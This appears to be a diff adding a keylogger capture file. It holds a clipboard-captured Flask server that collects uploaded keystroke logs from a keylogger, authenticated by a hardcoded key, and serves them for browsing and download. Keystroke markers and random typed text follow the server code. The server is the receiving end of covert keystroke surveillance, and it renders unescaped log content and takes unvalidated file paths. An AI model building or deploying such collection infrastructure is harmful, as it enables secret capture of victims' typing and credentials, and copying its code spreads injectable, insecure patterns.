@@ -1,0 +1,141 @@
+
+[CLIPBOARD] from flask import Flask, request, jsonify, send_from_directory, render_template_string
+from datetime import datetime
+from pathlib import Path
+
+app = Flask(__name__)
+log_dir = Path("server_logs")
+print("SERVER LOG FOLDER →", log_dir.resolve())
+log_dir.mkdir(exist_ok=True)
+
+API_KEY = "secret123"  # Must match keylogger
+
+# Homepage redirects to log folders
+@app.route("/")
+def home():
+    return view_log_folders()
+
+# ========== Upload Route ==========
+@app.route("/upload", methods=["POST"])
+def upload():
+    data = request.get_json()
+
+    if not data or data.get("api_key") != API_KEY:
+        return jsonify({"status": "error", "message": "Unauthorized"}), 401
+
+    content = data.get("log", "")
+    now = datetime.now()
+    date_folder = log_dir / now.strftime('%Y-%m-%d')
+    date_folder.mkdir(parents=True, exist_ok=True)
+
+    filename = date_folder / f"{now.strftime('%H-%M-%S')}.txt"
+
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(content)
+
+    return jsonify({"status": "success", "message": f"Log saved: {filename.name}"}), 200
+
+# ========== Folder View ==========
+@app.route("/view-logs")
+def view_log_folders():
+    folders = sorted([f.name for f in log_dir.iterdir() if f.is_dir()], reverse=True)
+    return render_template_string("""
+    <html>
+    <head>
+        <title>Organized Server Logs</title>
+        <style>
+            body { font-family: Arial; background: #f8f8f8; margin: 40px; }
+            h2 { color: #333; }
+            ul { list-style-type: none; padding: 0; }
+            li { padding: 10px; margin: 8px 0; background: #fff; border: 1px solid #ccc; border-radius: 6px; }
+            a { margin-left: 10px; text-decoration: none; color: #007BFF; }
+            a:hover { text-decoration: underline; }
+        </style>
+    </head>
+    <body>
+        <h2>📁 Organized Server Logs</h2>
+        {% if folders %}
+        <ul>
+        {% for folder in folders %}
+            <li>
+                📂 <strong>{{ folder }}</strong>
+                [<a href="/view-logs/{{ folder }}">Open</a>]
+            </li>
+        {% endfor %}
+        </ul>
+        {% else %}
+        <p>No log folders found.</p>
+        {% endif %}
+    </body>
+    </html>
+    """, folders=folders)
+
+# ========== Per-Day File Listing ==========
+@app.route("/view-logs/<date>")
+def view_logs_by_date(date):
+    date_path = log_dir / date
+    if not date_path.exists():
+        return f"No logs found for {date}", 404
+
+    files = sorted(date_path.glob("*.txt"), reverse=True)
+    return render_template_string("""
+    <html>
+    <head>
+        <title>Logs for {{ date }}</title>
+        <style>
+            body { font-family: Arial; background: #f8f8f8; margin: 40px; }
+            h2 { color: #333; }
+            ul { list-style-type: none; padding: 0; }
+            li { padding: 10px; margin: 8px 0; background: #fff; border: 1px solid #ccc; border-radius: 6px; }
+            a { margin-left: 10px; text-decoration: none; color: #007BFF; }
+            a:hover { text-decoration: underline; }
+        </style>
+    </head>
+    <body>
+        <h2>📂 Logs for {{ date }}</h2>
+        {% if files %}
+        <ul>
+        {% for file in files %}
+            <li>
+                📝 {{ file.name }}
+                [<a href="/read-log/{{ date }}/{{ file.name }}">View</a>]
+                [<a href="/download-log/{{ date }}/{{ file.name }}">Download</a>]
+            </li>
+        {% endfor %}
+        </ul>
+        {% else %}
+            <p>No log files in this folder.</p>
+        {% endif %}
+        <a href="/view-logs">⬅ Back to Folder View</a>
+    </body>
+    </html>
+    """, date=date, files=files)
+
+# ========== View Content ==========
+@app.route("/read-log/<date>/<filename>")
+def read_log(date, filename):
+    path = log_dir / date / filename
+    if path.exists():
+        content = path.read_text(encoding="utf-8")
+        return f"<h3>{date}/{filename}</h3><pre>{content}</pre>"
+    return "Log not found", 404
+
+# ========== Download ==========
+@app.route("/download-log/<date>/<filename>")
+def download_log(date, filename):
+    folder = log_dir / date
+    return send_from_directory(folder, filename, as_attachment=True)
+
+# ========== Run Server ==========
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
+
+[up][enter]
+[enter]
+[enter]
+roiohvhwej weohvn oewihdsnvjw seodivh neodsivbn ewods[enter]
+bensdomvi weosdivn mvpsd[enter]
+ esdkvun wmdvsoivxh newmdspoxzvh nemsvd[enter]
+esd9ihvnj ewpoishdnv pewoishdv eosdhv oesdi xvoiesd[enter]
+ sdiubxvn esdbhv9 iedbs ivbnds9o vghdsp [enter]
+[ctrl_l]
